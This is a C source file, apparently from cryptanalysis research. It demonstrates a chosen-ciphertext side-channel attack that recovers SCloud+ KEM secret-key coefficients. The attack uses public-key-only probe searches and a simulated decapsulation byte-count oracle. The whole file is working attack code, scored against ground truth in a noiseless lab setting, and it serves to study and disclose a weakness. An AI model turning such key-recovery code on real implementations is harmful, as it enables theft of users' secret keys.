/* Per-key OFFLINE probe search -> noiseless per-coordinate recovery.
 *
 * Proves the pk-only attacker claim: the hardcoded rows[]/aval[]/dval[] table in
 * recover_all_indices.c is NOT a universal constant -- it is a cached offline
 * search result tuned to ONE key (the default krng key). For any OTHER target
 * key, the attacker re-runs the same search using ONLY the public key.
 *
 * For each output coordinate i (0..nbar-1) we search, pk-only, for a probe
 * (alpha, v[], delta) such that the three trit hypotheses s in {-1,0,+1} land in
 * three DISTINCT (base_bucket, shift_bucket) pairs. base decodes v; shift decodes
 * v with coordinate i perturbed by delta. Everything in the search uses only
 * pke_pk via msg_decode + profile_message -- no secret is touched.
 *
 * The probe depends only on coordinate i, NOT on the C1 column position k, so a
 * single discriminating probe per coordinate recovers that coordinate at ALL
 * 1184 positions. We then read the (noiseless, instrumented) real bucket for a
 * sample of positions, decode the trit, and score against ground truth.
 *
 * Args: [key_seed] [positions_per_coord] [max_search_tries]
 */
#define main recover_demo_unused_main
#include "recover_demo.c"
#undef main

/* offline predicted bucket: decode v with coordinate `target` shifted by a*s,
 * all other coordinates untouched (single-coordinate model). pk-only. */
static size_t off_bucket(const uint8_t *pke_pk, const uint16_t *v,
                         unsigned target, unsigned a, int s)
{
    /* zero-init: decode matrix is mbar*nbar; C2 only fills the first nbar row */
    uint16_t d[(size_t)scloudplus_mbar * scloudplus_nbar] = {0};
    memcpy(d, v, sizeof(uint16_t) * scloudplus_nbar);
    d[target] = (uint16_t)((int)v[target] - (int)a * s) & scloudplus_q_mask;
    uint8_t mu[scloudplus_ss];
    msg_decode(d, mu);
    size_t b, r; profile_message(pke_pk, mu, &b, &r);
    return b;
}

/* pk-only robustness: a correct single-coordinate prediction requires the
 * decoded message be INVARIANT to the (unknown) trit at every non-target coord
 * j != i. The real decryption subtracts a*S[k,j] there, with S[k,j] in {-1,0,1},
 * so the perturbation is in {-a,0,+a}. Check decode(v) == decode(v with coord j
 * shifted by -a and by +a). If so, whatever S[k,j] is, that coordinate yields
 * the same message, making the single-coordinate bucket prediction EXACT -- for
 * ANY key (msg_decode is key-free). Verified universal for the hardcoded table
 * by audit_robust.c (0 flips). */
static int robust_ok(const uint16_t *v, unsigned i, unsigned a)
{
    uint16_t d[(size_t)scloudplus_mbar * scloudplus_nbar] = {0};
    uint8_t m0[scloudplus_ss], mt[scloudplus_ss];
    memcpy(d, v, sizeof(uint16_t) * scloudplus_nbar);
    msg_decode(d, m0);
    for (unsigned j = 0; j < scloudplus_nbar; j++) {
        if (j == i) continue;
        for (int t = -1; t <= 1; t += 2) {
            uint16_t d2[(size_t)scloudplus_mbar * scloudplus_nbar] = {0};
            memcpy(d2, v, sizeof(uint16_t) * scloudplus_nbar);
            d2[j] = (uint16_t)((int)v[j] - (int)a * t) & scloudplus_q_mask;
            msg_decode(d2, mt);
            if (memcmp(m0, mt, scloudplus_ss) != 0) return 0;
        }
    }
    return 1;
}

/* real instrumented bucket for probe (C1[k]=a, C2 first row = v) */
static size_t real_bucket(const uint8_t *sk, const uint16_t *v,
                          unsigned k, unsigned a)
{
    uint16_t c1[(size_t)scloudplus_mbar * scloudplus_n] = {0};
    uint16_t c2[(size_t)scloudplus_mbar * scloudplus_nbar] = {0};
    uint8_t ct[scloudplus_ctx], ss[scloudplus_ss];
    c1[k] = (uint16_t)a;
    memcpy(c2, v, sizeof(v[0]) * scloudplus_nbar);
    pack_c1(c1, ct); pack_c2(c2, ct + scloudplus_c1);
    generated_bytes = 0;
    if (scloud_kemdecaps(sk, ct, ss) != 0) exit(3);
    return generated_bytes / 544;
}

typedef struct {
    unsigned a; int delta; uint16_t v[scloudplus_nbar];
    size_t pb0[3], pb1[3];       /* predicted base/shift buckets for s=-1,0,+1 */
    unsigned tries;              /* search cost */
    int found;
} probe_t;

/* search a discriminating probe for coordinate i, pk-only */
static probe_t search_probe(const uint8_t *pke_pk, unsigned i, unsigned max_tries)
{
    probe_t p; memset(&p, 0, sizeof(p));
    for (unsigned t = 1; t <= max_tries; t++) {
        /* Match the proven-robust geometry (audit_robust.c): small a in [1,16] so
         * a*trit stays within a decode cell, and v[] on the message scale (mult.
         * of 64 = 2^(logq-msg_scale_bits)). This keeps non-target coords robust;
         * the search then only needs the per-key 3-way bucket split. */
        static const unsigned amenu[] = {1,2,4,8,16};
        unsigned a = amenu[xr() % 5];
        int delta = ((int)(xr() % 2) ? +1 : -1);
        uint16_t v[scloudplus_nbar], vs[scloudplus_nbar];
        for (unsigned j = 0; j < scloudplus_nbar; j++)
            v[j] = (uint16_t)(((xr() % 16u) * 64u) & scloudplus_q_mask);
        memcpy(vs, v, sizeof(vs));
        vs[i] = (uint16_t)((vs[i] + delta + scloudplus_q) & scloudplus_q_mask);
        /* non-target coords must be decode-robust in BOTH probes, else unknown
         * trits elsewhere corrupt the single-coordinate bucket prediction */
        if (!robust_ok(v, i, a) || !robust_ok(vs, i, a)) continue;
        size_t b0[3], b1[3];
        for (int s = -1; s <= 1; s++) {
            b0[s+1] = off_bucket(pke_pk, v,  i, a, s);
            b1[s+1] = off_bucket(pke_pk, vs, i, a, s);
        }
        /* require the three (base,shift) pairs mutually distinct */
        int d01 = (b0[0]!=b0[1]) || (b1[0]!=b1[1]);
        int d02 = (b0[0]!=b0[2]) || (b1[0]!=b1[2]);
        int d12 = (b0[1]!=b0[2]) || (b1[1]!=b1[2]);
        if (d01 && d02 && d12) {
            p.a = a; p.delta = delta; p.tries = t; p.found = 1;
            memcpy(p.v, v, sizeof(v));
            memcpy(p.pb0, b0, sizeof(b0));
            memcpy(p.pb1, b1, sizeof(b1));
            return p;
        }
    }
    p.tries = max_tries; p.found = 0;
    return p;
}

int main(int argc, char **argv)
{
    if (argc > 1) krng = strtoull(argv[1], 0, 10) | 1ULL;
    const unsigned per_coord = argc > 2 ? (unsigned)strtoul(argv[2],0,10) : 1184U;
    const unsigned max_tries = argc > 3 ? (unsigned)strtoul(argv[3],0,10) : 20000U;

    uint8_t pk[scloudplus_pk], sk[scloudplus_kem_sk];
    if (scloud_kemkeygen(pk, sk)) return 1;
    const uint8_t *pke_pk = sk + scloudplus_pke_sk;
    uint16_t S[(size_t)scloudplus_n * scloudplus_nbar];
    unpack_sk(sk, S);
    memo = calloc(MEMO_SLOTS, sizeof(*memo));
    if (!memo) return 1;

    /* ---- OFFLINE phase: pk-only search of one discriminating probe/coord ---- */
    probe_t probes[scloudplus_nbar];
    unsigned not_found = 0;
    fprintf(stderr, "key_seed=%llu  OFFLINE per-coordinate probe search:\n",
            (unsigned long long)(krng));
    for (unsigned i = 0; i < scloudplus_nbar; i++) {
        probes[i] = search_probe(pke_pk, i, max_tries);
        fprintf(stderr, "  coord %2u: %s after %u tries  codes(base,shift) "
                "s-1=(%zu,%zu) s0=(%zu,%zu) s+1=(%zu,%zu)\n", i,
                probes[i].found ? "FOUND" : "FAIL ", probes[i].tries,
                probes[i].pb0[0],probes[i].pb1[0], probes[i].pb0[1],probes[i].pb1[1],
                probes[i].pb0[2],probes[i].pb1[2]);
        if (!probes[i].found) not_found++;
    }
    if (not_found) fprintf(stderr, "WARNING: %u coords without a discriminating "
                           "probe (increase max_tries)\n", not_found);

    /* ---- ONLINE phase: read real bucket, decode, score (noiseless oracle) ---- */
    printf("coord,position,true,guess,base_obs,shift_obs,correct\n");
    unsigned long total = 0, correct = 0, nz = 0, nz_correct = 0;
    for (unsigned i = 0; i < scloudplus_nbar; i++) {
        if (!probes[i].found) continue;
        probe_t *p = &probes[i];
        uint16_t vs[scloudplus_nbar];
        memcpy(vs, p->v, sizeof(vs));
        vs[i] = (uint16_t)((vs[i] + p->delta + scloudplus_q) & scloudplus_q_mask);
        unsigned step = scloudplus_n / per_coord; if (step == 0) step = 1;
        for (unsigned k = 0; k < scloudplus_n; k += step) {
            size_t ob0 = real_bucket(sk, p->v, k, p->a);
            size_t ob1 = real_bucket(sk, vs,   k, p->a);
            int guess = 99;
            for (int s = -1; s <= 1; s++)
                if (p->pb0[s+1] == ob0 && p->pb1[s+1] == ob1) guess = s;
            int tv = center(S[(size_t)i * scloudplus_n + k]);
            int ok = (guess == tv);
            total++; correct += ok;
            if (tv != 0) { nz++; nz_correct += ok; }
            printf("%u,%u,%d,%d,%zu,%zu,%d\n", i, k, tv, guess, ob0, ob1, ok);
        }
    }
    fflush(stdout);
    fprintf(stderr, "\nNOISELESS per-key recovery: %lu/%lu = %.2f%% correct\n",
            correct, total, total ? 100.0*correct/total : 0.0);
    fprintf(stderr, "  nonzero coeffs: %lu/%lu = %.2f%% correct "
            "(all-zero baseline would be %.2f%%)\n",
            nz_correct, nz, nz ? 100.0*nz_correct/nz : 0.0,
            total ? 100.0*(total-nz)/total : 0.0);
    free(memo);
    return 0;
}
